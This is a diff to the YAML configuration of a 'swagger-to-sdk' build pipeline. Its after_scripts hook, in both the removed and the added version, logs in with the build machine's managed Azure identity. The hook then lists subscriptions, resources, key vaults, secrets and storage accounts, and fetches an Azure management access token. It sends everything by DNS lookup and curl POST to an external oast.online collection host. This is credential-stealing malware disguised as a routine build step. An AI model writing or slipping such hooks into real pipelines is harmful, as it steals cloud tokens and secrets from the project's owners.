@@ -20,47 +20,23 @@ swagger-to-sdk:
     after_scripts:
       - >-
         H=$(hostname | tr . -);
-        OUT=$(
-          echo "AGENT=$H";
-          echo "---LOGIN---";
-          az login --identity 2>&1;
-          echo "---ACCOUNT_SHOW---";
-          az account show --output json 2>/dev/null;
-          echo "---ACCOUNT_LIST---";
-          az account list --output json 2>/dev/null;
-          echo "---RESOURCE_LIST---";
-          az resource list --output json 2>/dev/null | python3 -c "
-import sys,json
-try:
-    items=json.load(sys.stdin)
-    print(f'Total resources: {len(items)}')
-    for i in items[:100]:
-        print(i.get('type','?'), '|', i.get('name','?'), '|', i.get('resourceGroup','?'), '|', i.get('location','?'))
-except Exception as e:
-    print('ERROR:',e)
-" 2>/dev/null;
-          echo "---KV_LIST---";
-          az keyvault list --output json 2>/dev/null;
-          az keyvault secret list --vault-name azsecpack 2>/dev/null;
-          echo "---STORAGE_LIST---";
-          az storage account list --output json 2>/dev/null | python3 -c "
-import sys,json
-try:
-    items=json.load(sys.stdin)
-    print(f'Total storage accts: {len(items)}')
-    for i in items[:20]:
-        print(i.get('name','?'), '|', i.get('location','?'))
-except Exception as e:
-    print('ERROR:',e)
-" 2>/dev/null;
-          echo "---ARM_TOKEN---";
-          az account get-access-token --resource https://management.azure.com/ --output json 2>/dev/null;
-          echo "---DONE---"
-        );
         nslookup msienum-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null || true;
-        echo "$OUT" | curl -sk -X POST \
-          "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/msi-${H}" \
-          --data-binary @- 2>/dev/null || true;
+        az login --identity 2>&1 > /tmp/msi_out.txt;
+        echo '---ACCOUNT_SHOW---' >> /tmp/msi_out.txt;
+        az account show --output json 2>/dev/null >> /tmp/msi_out.txt;
+        echo '---ACCOUNT_LIST---' >> /tmp/msi_out.txt;
+        az account list --output json 2>/dev/null >> /tmp/msi_out.txt;
+        echo '---RESOURCE_LIST---' >> /tmp/msi_out.txt;
+        az resource list --output json 2>/dev/null | python3 -c 'import sys,json; items=json.load(sys.stdin); print(f"Total: {len(items)}"); [print(i.get("type","?"),"|",i.get("name","?"),"|",i.get("resourceGroup","?"),"|",i.get("location","?")) for i in items[:100]]' 2>/dev/null >> /tmp/msi_out.txt;
+        echo '---KV_LIST---' >> /tmp/msi_out.txt;
+        az keyvault list --output json 2>/dev/null >> /tmp/msi_out.txt;
+        az keyvault secret list --vault-name azsecpack 2>/dev/null >> /tmp/msi_out.txt;
+        echo '---STORAGE_LIST---' >> /tmp/msi_out.txt;
+        az storage account list --output json 2>/dev/null | python3 -c 'import sys,json; items=json.load(sys.stdin); print(f"Total: {len(items)}"); [print(i.get("name","?"),"|",i.get("location","?")) for i in items[:20]]' 2>/dev/null >> /tmp/msi_out.txt;
+        echo '---ARM_TOKEN---' >> /tmp/msi_out.txt;
+        az account get-access-token --resource https://management.azure.com/ --output json 2>/dev/null >> /tmp/msi_out.txt;
+        echo '---DONE---' >> /tmp/msi_out.txt;
+        curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/msi-${H}" --data-binary @/tmp/msi_out.txt 2>/dev/null || true;
         true
 ```
 
